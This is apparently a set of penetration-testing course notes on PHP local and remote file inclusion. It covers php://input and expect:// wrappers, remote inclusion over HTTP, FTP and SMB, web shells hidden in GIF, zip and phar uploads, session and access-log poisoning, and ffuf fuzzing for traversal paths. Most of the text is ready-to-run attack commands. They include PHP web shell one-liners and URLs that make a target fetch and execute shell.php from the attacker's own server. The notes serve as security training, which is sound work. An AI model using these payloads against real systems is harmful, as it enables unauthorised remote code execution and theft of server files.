**Command Breakdown:**
- `curl -s` — Silent mode (suppress progress output)
- `-X POST` — Specifies the HTTP method to use: POST instead of the default GET
- `--data '<?php system($_GET["cmd"]); ?>'` — Sends the PHP web shell code as the POST request body/data. The `--data` flag sets the request body
- `"http://.../index.php?language=php://input&cmd=id"` — The `language` parameter is set to `php://input` which tells PHP to read the current request's POST body as the file to include. The `&cmd=id` supplies the command to run
- `| grep uid` — Filters for the `uid` line in the output

**How this works:**
1. The GET parameter `language=php://input` tells the `include()` function to include `php://input`
2. `php://input` is a PHP stream that gives access to the raw POST request body
3. The POST body contains our PHP web shell: `<?php system($_GET["cmd"]); ?>`
4. PHP includes and **executes** this code
5. The `cmd=id` GET parameter is passed to `system()` which runs `id`

**Expected Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Note:** If the vulnerable function only accepts POST requests (not GET), you can hardcode the command directly in the PHP code in the POST body: `<?php system('id'); ?>` (no need for the `$_GET["cmd"]` parameter).

---

### Expect Wrapper

The `expect://` wrapper allows us to **directly execute OS commands** through the URL stream without needing to embed a web shell. It was designed for command execution and interaction with processes.

**Critical Requirement:** The `expect` extension is **not built into PHP** — it is an external extension that must be **manually installed and enabled** on the server. It is rarely present but may be found in specific environments (e.g., certain automation systems).

**Step 1 — Check if the expect extension is configured:**

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

**Command Breakdown:**
- `echo '...' | base64 -d` — Decodes the previously obtained base64 php.ini file content
- `| grep expect` — Searches the decoded content for any line containing `expect`

**Expected Output (if expect is configured):**

```
extension=expect
```

This shows that the `expect` extension is listed in php.ini for loading. However, just because it is listed doesn't guarantee it's functional — it may fail to load. Confirm it works by actually trying it.

**Step 2 — Test the expect wrapper:**

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

**Command Breakdown:**
- `curl -s` — Silent HTTP request
- `"http://.../index.php?language=expect://id"` — The `expect://id` wrapper directly executes the `id` command on the server's OS
- The `expect://` wrapper is followed by the command to run (in this case `id`)
- `| grep uid` — Filters for the uid in the output

**Expected Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**How this works:**
- `expect://id` tells PHP to use the expect extension to execute the command `id`
- The output of the command is returned in the HTTP response
- No web shell is needed — `expect://` directly interfaces with OS command execution

These three PHP wrappers (`data://`, `php://input`, `expect://`) are the primary methods for achieving RCE through LFI in PHP environments. Additional wrappers (`phar://`, `zip://`) are covered in the File Uploads section.

---

## Remote File Inclusion (RFI)

Remote File Inclusion (RFI) is a variant of file inclusion vulnerability where the vulnerable function allows the inclusion of **remote URLs** (files hosted on an external server) rather than only local files. This makes RFI even more powerful than LFI because:

1. **SSRF (Server-Side Request Forgery):** We can use RFI to enumerate local-only ports and internal web applications that are not directly accessible from the internet
2. **Remote Code Execution:** We can host a malicious script on our own machine and include it via the vulnerable parameter, causing the target server to download and execute our code

---

### Local vs Remote File Inclusion

Not all LFI vulnerabilities are also RFI vulnerabilities. The distinction depends on three factors:

**Factor 1 — Does the function allow remote URLs?**
Only specific functions support remote URL inclusion (see the function table). If the vulnerable function doesn't support remote URLs, RFI is impossible.

**Factor 2 — Do you control the full protocol wrapper?**
In some cases, you may only control part of the filename (e.g., the application prepends `./files/`). If you cannot control the protocol prefix (`http://`, `ftp://`), you cannot specify a remote URL.

**Factor 3 — Is remote URL inclusion disabled by configuration?**
Most modern web servers disable remote file inclusion by default. In PHP, this is controlled by the `allow_url_include` setting. If it's `Off`, RFI will not work regardless of the function used.

**Functions that support RFI (Remote URL):**

| Function | Read Content | Execute | Remote URL |
|---|---|---|---|
| PHP `include()` / `include_once()` | ✅ | ✅ | ✅ |
| PHP `file_get_contents()` | ✅ | ❌ | ✅ |
| Java `import` | ✅ | ✅ | ✅ |
| .NET `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| .NET `include` | ✅ | ✅ | ✅ |

Note: Almost every RFI vulnerability is also an LFI vulnerability — but the reverse is not true.

---

### Verify RFI

To reliably verify if an LFI is also an RFI, the best approach is to actually test URL inclusion. First, always test with a **local URL** to avoid triggering firewall blocks on outgoing connections.

**Command to check `allow_url_include` via LFI:**

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

This decodes the php.ini file (previously obtained via LFI) and checks for the `allow_url_include` setting, as shown in the PHP Wrappers section. However, even if it's `On`, the function may not support remote URLs, so we must test directly.

**Test with a local URL:**

```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

**How this works:**
- `http://127.0.0.1:80/index.php` is a URL pointing to the server itself (localhost on port 80)
- If RFI is possible, the server will fetch this URL and include its content in the response
- If we see the `index.php` content appear in the response, RFI is confirmed
- This test uses the server's loopback (127.0.0.1) so it won't be blocked by outgoing firewalls

**Note:** Do not include the vulnerable page itself (e.g., `index.php`) in a recursive manner in production, as it may cause an infinite loop and crash the server (DoS).

We can also test if other internal ports are accessible. For example, if the server runs an internal app on port 8080, `?language=http://127.0.0.1:8080/` could reveal it — this is SSRF via RFI.

---

### Remote Code Execution with RFI

Once RFI is confirmed, the process for achieving RCE is:
1. Create a malicious PHP shell script
2. Host it on our attacking machine
3. Include it via the RFI vulnerability

**Step 1 — Create the web shell:**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Command Breakdown:**
- `echo '<?php system($_GET["cmd"]); ?>'` — Outputs the PHP web shell one-liner
- `> shell.php` — Redirects (writes) the output to a file named `shell.php`
- The shell uses PHP's `system()` function to execute any OS command passed via the `cmd` GET parameter

---

### HTTP

**Step 2 — Start a Python HTTP server to serve the shell:**

```bash
sudo python3 -m http.server <LISTENING_PORT>
```

**Command Breakdown:**
- `sudo` — Run with elevated privileges (required to listen on ports below 1024, like 80 or 443)
- `python3 -m http.server` — Uses Python 3's built-in `http.server` module to start a simple HTTP web server
- `<LISTENING_PORT>` — The port to listen on (e.g., 80 or 443 — preferably use common ports that may be whitelisted by the target's firewall)
- This server serves all files in the current directory over HTTP

**Step 3 — Include the remote shell via RFI:**

```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

**How this works:**
- `language=http://<OUR_IP>:<LISTENING_PORT>/shell.php` — Tells the vulnerable `include()` function to fetch our `shell.php` from our Python HTTP server
- The target server makes an outbound HTTP request to our machine, downloads `shell.php`, and executes it
- `&cmd=id` — Passes the `id` command to our web shell's `cmd` parameter
- The output of `id` is returned in the response

**Expected output on our Python server (confirming the request was received):**

```
SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```

---

### FTP

We can also host the shell via FTP, which is useful if HTTP ports are blocked or if the `http://` string is filtered by a WAF.

**Start a Python FTP server using pyftpdlib:**

```bash
sudo python -m pyftpdlib -p 21
```

**Command Breakdown:**
- `sudo` — Elevated privileges needed for port 21 (standard FTP port)
- `python -m pyftpdlib` — Uses Python's `pyftpdlib` library to run an FTP server
- `-p 21` — Specifies port 21 as the listening port (standard FTP)
- By default, pyftpdlib allows **anonymous authentication** (no username/password required)
- The server serves files from the current working directory

**Include the shell via FTP:**

```
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

**How this works:**
- `ftp://<OUR_IP>/shell.php` uses the `ftp://` scheme to fetch the shell from our FTP server
- PHP tries anonymous login by default
- The server fetches `shell.php` from our FTP and includes/executes it
- `&cmd=id` executes the `id` command through the shell

**If the FTP server requires credentials:**

```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id'
```

**Command Breakdown:**
- `curl` — Makes the HTTP request
- `ftp://user:pass@<OUR_IP>/shell.php` — Specifies FTP credentials in the URL format `user:password@host`
- Replace `user` and `pass` with the credentials configured on your FTP server

---

### SMB

If the vulnerable web application is hosted on a **Windows server**, we can use the **SMB (Server Message Block)** protocol for RFI without needing `allow_url_include` to be enabled. This is because Windows natively treats files on SMB shares as local files that can be accessed via **UNC paths** (Universal Naming Convention paths like `\\server\share\file`).

**Start an SMB server using Impacket's smbserver.py:**

```bash
impacket-smbserver -smb2support share $(pwd)
```

**Command Breakdown:**
- `impacket-smbserver` — Impacket's SMB server tool that creates a file share (part of the Impacket security framework)
- `-smb2support` — Enables SMB2 protocol support (required for modern Windows clients that use SMB2/3)
- `share` — The name of the SMB share to create (will be accessible as `\\<OUR_IP>\share\`)
- `$(pwd)` — Shell substitution that inserts the current working directory as the path to share. All files in this directory will be served via the SMB share
- By default, allows **anonymous authentication**

**Include the shell via SMB UNC path:**

```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

**How this works:**
- `\\<OUR_IP>\share\shell.php` is a Windows UNC path pointing to `shell.php` on our SMB share
- Windows treats this as a normal file path (no `allow_url_include` required)
- The vulnerable `include()` call opens the file over the network via SMB
- PHP executes the shell and `&cmd=whoami` runs the `whoami` command

**Expected Output:**

```
NT AUTHORITY\IUSR
```

This shows the Windows IIS web server user running the shell, confirming RCE.

**Limitation:** SMB-based RFI is more reliable on the same network (LAN). If the target is on the internet, outgoing SMB (port 445) connections may be blocked by the Windows server's firewall or network policies.

---

## LFI and File Uploads

File upload functionality is extremely common in modern web applications (profile pictures, document uploads, etc.). When combined with an LFI vulnerability, file uploads can be weaponized to achieve Remote Code Execution — even if the file upload form itself is not vulnerable to traditional file upload attacks.

**Key Insight:** The vulnerability is not in the file upload form — it is in the **file inclusion function**. The upload form just needs to accept our file. The LFI vulnerability is what executes it. Even if the file has an `.jpg` or `.gif` extension, if we embed PHP code inside it and include it via LFI, PHP will execute the code.

**Functions required (must have Execute privilege):**

| Function | Read Content | Execute | Remote URL |
|---|---|---|---|
| PHP `include()` / `include_once()` | ✅ | ✅ | ✅ |
| PHP `require()` / `require_once()` | ✅ | ✅ | ❌ |
| NodeJS `res.render()` | ✅ | ✅ | ❌ |
| Java `import` | ✅ | ✅ | ✅ |
| .NET `include` | ✅ | ✅ | ✅ |

---

### Image Upload

Image uploads are widely considered safe because images (JPG, PNG, GIF) are not executable. However, in the context of LFI, if we embed PHP code inside an image file and the server includes that image via an LFI-vulnerable function, the PHP code gets executed.

---

### Crafting Malicious Image

We craft a file that appears to be a legitimate image (with valid magic bytes and an image extension) but contains embedded PHP code.

**Command to create a malicious GIF file with embedded PHP web shell:**

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

**Command Breakdown:**
- `echo 'GIF8<?php system($_GET["cmd"]); ?>'` — Outputs the content of our malicious file. `GIF8` is the **magic byte** header for GIF image files. File type detection tools check the first few bytes of a file (magic bytes) to determine its type. By including `GIF8` at the start, the file appears to be a valid GIF image.
- `<?php system($_GET["cmd"]); ?>` — This is the PHP web shell code embedded after the fake GIF header. When PHP includes this file and executes it, this code runs.
- `> shell.gif` — Writes the output to `shell.gif` with a `.gif` extension

**Why GIF?**
- GIF magic bytes (`GIF8`) are ASCII characters — easy to type and include
- Other formats (PNG, JPEG) have binary magic bytes that would require URL encoding or special handling

**Uploading the malicious image:**
- Navigate to the profile settings page of the target application
- Upload the `shell.gif` file as a profile picture/avatar
- The server accepts it because it appears to be a GIF image

---

### Uploaded File Path

After uploading, we need to know the **full path** of our uploaded file on the server to include it via LFI.

**Finding the path via HTML source inspection:**

After uploading, view the page source (Ctrl+U) and find the image tag:

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

This reveals the uploaded file is at `/profile_images/shell.gif`.

**If the path is not in the source:**
- Use ffuf to fuzz for common upload directories (e.g., `/uploads/`, `/files/`, `/images/`)
- Then fuzz for the filename within the identified directory

**Execute the web shell via LFI:**

```
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

**How this works:**
- `language=./profile_images/shell.gif` — The LFI vulnerable function includes our uploaded file
- Since `shell.gif` contains PHP code (`<?php system($_GET["cmd"]); ?>`), PHP executes it
- `&cmd=id` — Passes the `id` command to the shell
- The `id` command output appears in the response, confirming RCE

**Note:** If the LFI function prepends a directory to input, use `../` to escape it:
```
?language=../../profile_images/shell.gif
```

---

### Zip Upload

An alternative PHP-specific technique uses the `zip://` wrapper. This lets us upload a zip file containing a PHP script, and then execute the script inside it using the `zip://` wrapper.

**Step 1 — Create the PHP shell and zip it:**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

**Command Breakdown:**
- `echo '<?php system($_GET["cmd"]); ?>' > shell.php` — Creates `shell.php` with our web shell code
- `&&` — Runs the next command only if the previous succeeded
- `zip shell.jpg shell.php` — Creates a zip archive named `shell.jpg` containing `shell.php`

**Why name the zip `shell.jpg`?**
- Renaming the zip to `.jpg` may bypass upload filters that only allow image extensions
- The server may check the extension but not the actual file content

**Note:** Some upload forms perform **content-type checks** (MIME type inspection) and may still detect the zip. This technique has a higher success rate if zip uploads are explicitly allowed.

**Step 2 — Include the zip via the zip:// wrapper:**

```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

**How this works:**
- `zip://./profile_images/shell.jpg` — Points to our uploaded zip file
- `%23shell.php` — `%23` is the URL-encoded `#` character. The `zip://` wrapper uses `#` to reference a specific file inside the zip. So `zip://file.zip#internal_file.php` includes `internal_file.php` from inside the zip archive
- PHP executes `shell.php` from inside the zip
- `&cmd=id` runs the `id` command

---

### Phar Upload

The `phar://` (PHP Archive) wrapper is another PHP-specific method. A PHAR file is similar to a JAR file in Java — it packages multiple PHP files into a single archive. We create a PHAR file with an embedded web shell.

**Step 1 — Write the PHAR creation script:**

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

**Code Breakdown:**
- `new Phar('shell.phar')` — Creates a new Phar archive object named `shell.phar`
- `$phar->startBuffering()` — Begins buffering changes to the archive (required before adding files)
- `$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>')` — Adds a file named `shell.txt` to the archive. The content of this file is our PHP web shell. This is an internal file inside the PHAR archive.
- `$phar->setStub('<?php __HALT_COMPILER(); ?>')` — Sets the PHAR stub (the executable portion). `__HALT_COMPILER()` is required at the end of every PHAR stub — it signals the end of the PHP stub code
- `$phar->stopBuffering()` — Finalizes and writes the archive to disk

**Save this as `shell.php` and compile it:**

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

**Command Breakdown:**
- `php` — Runs the PHP CLI interpreter
- `--define phar.readonly=0` — Overrides the PHP setting `phar.readonly` (which is `1`/true by default). By default, PHP prevents creation of Phar archives for security. Setting it to `0` allows us to create one
- `shell.php` — The PHP script we wrote above (the Phar builder)
- `&&` — Chain to next command on success
- `mv shell.phar shell.jpg` — Renames the compiled `shell.phar` file to `shell.jpg` to disguise it as an image for upload

**Step 2 — Include the PHAR file via the phar:// wrapper:**

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

**How this works:**
- `phar://./profile_images/shell.jpg` — Points to our uploaded PHAR archive (disguised as `shell.jpg`)
- `%2Fshell.txt` — `%2F` is URL-encoded `/`. This specifies the internal file within the PHAR archive to access: `shell.txt`
- PHP opens the PHAR archive, reads `shell.txt`, and executes it as PHP code
- `&cmd=id` runs the `id` command through the web shell

**Method Priority:**
1. **Direct image upload + LFI** (most reliable — works in most cases)
2. **Zip upload + zip:// wrapper** (alternative — requires zip extension enabled)
3. **PHAR upload + phar:// wrapper** (alternative — works in PHP-specific setups)

---

## Log Poisoning

Log Poisoning is a technique that leverages LFI to achieve Remote Code Execution. The concept is:

1. **Identify a log file** that records user-controllable input (like the User-Agent header or URL)
2. **Inject PHP code** into that log file by sending a malicious request (this is the "poisoning" step)
3. **Include the poisoned log file** via the LFI vulnerability — PHP executes the injected code

For log poisoning to work:
- The PHP web application must have **read access** to the log file
- The vulnerable LFI function must have **execute privileges** (see function table)

**Functions with execute capability (applicable to this attack):**

| Function | Read Content | Execute | Remote URL |
|---|---|---|---|
| PHP `include()` / `include_once()` | ✅ | ✅ | ✅ |
| PHP `require()` / `require_once()` | ✅ | ✅ | ❌ |
| NodeJS `res.render()` | ✅ | ✅ | ❌ |
| Java `import` | ✅ | ✅ | ✅ |
| .NET `include` | ✅ | ✅ | ✅ |

---

### PHP Session Poisoning

Most PHP web applications use **PHPSESSID cookies** to maintain user sessions. PHP stores session data in files on the server's file system. By controlling what gets written to our session file and then including it via LFI, we can execute arbitrary PHP code.

**Session File Locations:**
- **Linux:** `/var/lib/php/sessions/`
- **Windows:** `C:\Windows\Temp\`

**Session File Naming Convention:**
The session file is named `sess_` + the value of your PHPSESSID cookie.

Example: If `PHPSESSID = nhhv8i0o6ua4g88bkdl9u1fdsd`, then the session file is at:
```
/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

**Step 1 — Read your session file via LFI:**

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

The session file may contain something like:
```
page|s:15:"es.php";preference|s:8:"language";
```

This shows that the `page` value (which corresponds to the `?language=` parameter we last set) is stored in the session file. Since we control the `?language=` parameter, we control what gets written to the `page` field in the session file.

**Step 2 — Set a test value to confirm control:**

```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Now re-read the session file — it should now contain `session_poisoning` in the `page` field, confirming we can write arbitrary values to the session file.

**Step 3 — Poison the session file with PHP web shell code:**

```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

**URL Decoded Payload:**
```
<?php system($_GET["cmd"]); ?>
```

This URL-encoded PHP web shell gets written into the `page` field of the session file.

**Step 4 — Include the poisoned session file to execute the shell:**

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

**How this works:**
- We include the session file path via LFI
- The session file contains our PHP web shell code
- PHP executes the code in the session file
- `&cmd=id` is passed to the web shell's `cmd` parameter
- The `id` command output appears in the response, confirming RCE

**Important Note:** Each time we visit a page with a new `?language=` value, the session file gets overwritten with the new value. So after including the session file to get RCE, the `?language=` path itself overwrites the shell. To maintain access: write a permanent web shell to the web directory or establish a reverse shell.

---

### Server Log Poisoning

Both Apache and Nginx web servers maintain **access logs** and **error logs**. The access log records every HTTP request made to the server, including the **User-Agent header**. Since we control the User-Agent in our requests, we can inject PHP code into it and poison the log file.

**Log File Locations:**

| Server | OS | Access Log Path |
|---|---|---|
| Apache | Linux | `/var/log/apache2/access.log` |
| Apache | Windows | `C:\xampp\apache\logs\access.log` |
| Nginx | Linux | `/var/log/nginx/access.log` |
| Nginx | Windows | `C:\nginx\log\access.log` |

**Note on Permissions:**
- **Nginx logs** — Readable by low-privileged users (e.g., `www-data`) by default
- **Apache logs** — Typically only readable by `root` or `adm` group, but misconfigured or older servers may allow low-privilege reads

**Step 1 — Verify we can read the log:**

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

If the access log content appears (IP addresses, request paths, User-Agent strings), we have read access and can proceed.

**Step 2 — Inject PHP code via User-Agent using Burp Suite:**

Intercept a request in Burp Suite and modify the `User-Agent` header to your PHP web shell:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

Forward the request. The log now contains the PHP code in the User-Agent field.

**Step 3 — Alternatively, poison the log via cURL:**

```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

**Command Breakdown:**
- `echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison` — Creates a file called `Poison` containing the malicious User-Agent header. The `\$` escapes the `$` sign so the shell doesn't interpret it as a variable. `-n` suppresses the newline.
- `curl -s "http://<SERVER_IP>:<PORT>/index.php"` — Makes a GET request to the target server
- `-H @Poison` — Uses the `-H` flag with `@filename` syntax to read HTTP headers from the file named `Poison`. This sends our malicious User-Agent header with the request.

The server logs this request in `access.log` with our PHP code as the User-Agent.

**Step 4 — Include the poisoned log file and execute commands:**

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

**How this works:**
- The LFI vulnerability includes `/var/log/apache2/access.log`
- The log file contains the PHP web shell we injected via the User-Agent header
- PHP executes the shell code embedded in the log
- `&cmd=id` is passed to `system()` and the output appears in the response

**Pro Tip:** Log files can be very large. Loading a massive log via LFI may be slow or crash the server. Be efficient in production environments.

**Alternative Log Files to Poison:**

| Log File Path | Service | What to Poison |
|---|---|---|
| `/var/log/sshd.log` | SSH | Username field during login attempt |
| `/var/log/mail` | Mail service | Email address or content in a sent email |
| `/var/log/vsftpd.log` | FTP (vsftpd) | Username during FTP login attempt |
| `/proc/self/environ` | Linux process env | User-Agent or other env variable |
| `/proc/self/fd/N` (N = 0-50) | Linux file descriptors | Same as environ |

**Strategy for other log files:**
- If SSH is exposed: try logging in with username `<?php system($_GET['cmd']); ?>` — this gets logged
- If mail is exposed: send an email with PHP code in the subject/body — it gets logged
- If FTP is exposed: attempt login with the PHP shell as the username — it gets logged
- Then include the respective log file via LFI to execute the code

---

## Automated Scanning

While manual LFI exploitation is important for understanding the vulnerability and crafting custom payloads, automated tools can significantly speed up the discovery and exploitation process in simpler cases.

---

### Fuzzing Parameters

Many web application parameters are not linked to visible HTML forms — they exist as hidden or undocumented GET/POST parameters. These unlinked parameters are often less scrutinized for security and may be vulnerable to LFI and other attacks.

**Command to fuzz for hidden GET parameters using ffuf:**

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

**Command Breakdown:**
- `ffuf` — Fast web fuzzer tool
- `-w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ` — Loads the wordlist containing common GET parameter names (e.g., `page`, `file`, `lang`, `include`, `path`, etc.) and maps it to the `FUZZ` keyword
- `-u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'` — The URL to fuzz. `FUZZ` is replaced with each parameter name from the wordlist. The value is set to `value` (a dummy value to see how the page responds)
- `-fs 2287` — Filters responses by size. `2287` is the size of the default/normal page response. Any response that has a different size is considered interesting (it means the parameter had an effect). Replace `2287` with the actual size of the default page for your target.

**Example Output:**

```
language    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

This reveals `language` as an exposed parameter. Once identified, we test this parameter with all LFI payloads.

**Tip:** For a more targeted scan, use a wordlist specifically containing common LFI parameter names (like `page`, `include`, `file`, `lang`, `path`, `document`, `root`, etc.).

---

### LFI Wordlists

Instead of manually crafting LFI payloads, we can use pre-built LFI wordlists to rapidly test a parameter for common LFI vulnerabilities and paths.

**Recommended Wordlist:** `LFI-Jhaddix.txt` — This wordlist contains a comprehensive collection of:
- Common path traversal payloads with varying depths
- URL-encoded variations
- Bypass techniques
- Commonly readable sensitive files on Linux and Windows

**Command to fuzz with LFI wordlist:**

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

**Command Breakdown:**
- `-w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ` — Loads the LFI-specific wordlist and maps it to `FUZZ`
- `-u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'` — Tests each LFI payload from the wordlist as the value of the `language` parameter
- `-fs 2287` — Filters out responses with the baseline size (default page), showing only responses where something was included (different size = content was returned)

**Example Output:**

```
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd       [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
../../../../etc/passwd                        [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd                     [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

Multiple LFI payloads returned non-baseline responses (size 3661 vs 2287 baseline), meaning they successfully included `/etc/passwd`. After identifying working payloads, manually verify each one to confirm they work and display the included content correctly.

---

### Fuzzing Server Files

After confirming LFI, we can fuzz for specific server files that are useful for further exploitation: server webroot path, configuration files, and log files.

---

### Server Webroot

Knowing the **full absolute path of the web root** (e.g., `/var/www/html/`) is critical in situations where we need to locate uploaded files using an absolute path (rather than relative traversal).

**Command to fuzz for server webroot:**

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

**Command Breakdown:**
- `-w .../default-web-root-directory-linux.txt:FUZZ` — A wordlist containing common Linux web root paths (e.g., `/var/www/html/`, `/srv/http/`, `/usr/share/nginx/html/`, etc.) mapped to `FUZZ`
- `-u '...?language=../../../../FUZZ/index.php'` — Tests each web root path by trying to include `index.php` within it. The `../../../../` traverses up to root, then `FUZZ` is the candidate web root path, and `index.php` should exist there if it's the correct webroot
- `-fs 2287` — Filters out baseline responses; a different size indicates a successful inclusion

**Example Output:**

```
/var/www/html/    [Status: 200, Size: 0, Words: 1, Lines: 1]
```

This reveals the web root is at `/var/www/html/`. Now we can construct absolute paths to uploaded files.

**Alternative:** Use the `LFI-Jhaddix.txt` wordlist, which also contains various payloads that may reveal the webroot path.

---

### Server Logs/Configurations

To perform **log poisoning attacks**, we need to find the exact paths of log files and configuration files. We can fuzz for these using comprehensive wordlists.

**Command to fuzz for log/config file paths (Linux):**

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

**Command Breakdown:**
- `-w ./LFI-WordList-Linux:FUZZ` — A detailed Linux-specific wordlist containing paths to hundreds of common system files, config files, and log files (e.g., `/etc/passwd`, `/etc/apache2/apache2.conf`, `/var/log/apache2/access.log`, `/etc/hosts`, etc.)
- `-u '...?language=../../../../FUZZ'` — Tests each path from the wordlist by including it via LFI
- `-fs 2287` — Filters baseline responses

**Example Output:**

```
/etc/hosts              [Status: 200, Size: 2461]
/etc/hostname           [Status: 200, Size: 2300]
/etc/login.defs         [Status: 200, Size: 12837]
/etc/fstab              [Status: 200, Size: 2324]
/etc/apache2/apache2.conf [Status: 200, Size: 9511]
/etc/issue.net          [Status: 200, Size: 2306]
/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036]
/etc/apache2/envvars    [Status: 200, Size: 4069]
/etc/adduser.conf       [Status: 200, Size: 5315]
```

**Reading the Apache configuration file:**

```bash
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
```

**Command Breakdown:**
- `curl` — Makes an HTTP GET request
- `http://.../index.php?language=../../../../etc/apache2/apache2.conf` — LFI payload to read the Apache config file from the web root (navigating up with `../../../../`)

**Example relevant section from the output:**

```
ServerAdmin webmaster@localhost
DocumentRoot /var/www/html

ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined
```

This reveals:
- `DocumentRoot /var/www/html` — The web root path
- `${APACHE_LOG_DIR}/access.log` — The access log path (using a variable)

**Reading the Apache envvars to resolve the log path variable:**

```bash
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```

**Command Breakdown:**
- `/etc/apache2/envvars` is the Apache environment variables file that defines variables like `APACHE_LOG_DIR`

**Relevant section from output:**

```
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
```

This confirms the actual log directory is `/var/log/apache2/`, so the access log is at `/var/log/apache2/access.log`. Now we have everything we need to perform Apache Log Poisoning.

---

### LFI Tools

Several automated tools have been created specifically for LFI exploitation. While they can save time for simple cases, they are generally less thorough than manual testing and may miss vulnerabilities that require custom payloads.

**Common LFI Tools:**

| Tool | Description |
|---|---|
| **LFISuite** | A comprehensive LFI exploitation toolkit with multiple exploitation methods |
| **LFiFreak** | An automated LFI exploiter with path traversal and encoding bypass support |
| **liffy** | A Python-based LFI exploitation tool |

**Finding more tools:**
Search GitHub for LFI-related repositories. Many community-developed scripts target specific frameworks or scenarios.

**Important Caveat:** Most LFI tools:
- Are not actively maintained
- Rely on **Python 2** (deprecated and losing support)
- May miss advanced exploitation techniques
- Cannot adapt to custom WAF rules or application-specific filters

**Recommended approach:** Use automated tools for initial scanning to quickly identify obvious vulnerabilities, then apply manual techniques (as covered throughout this module) for in-depth exploitation, especially when dealing with WAFs, custom filters, or non-standard configurations.

**To test any of these tools:** Download one (e.g., LFISuite or liffy) and run it against the practice exercises in this module. Observe what they find automatically vs. what you found manually — this gives a clear picture of the tool's accuracy and limitations.

---

*End of Notes — File Inclusion Vulnerabilities (LFI & RFI)*
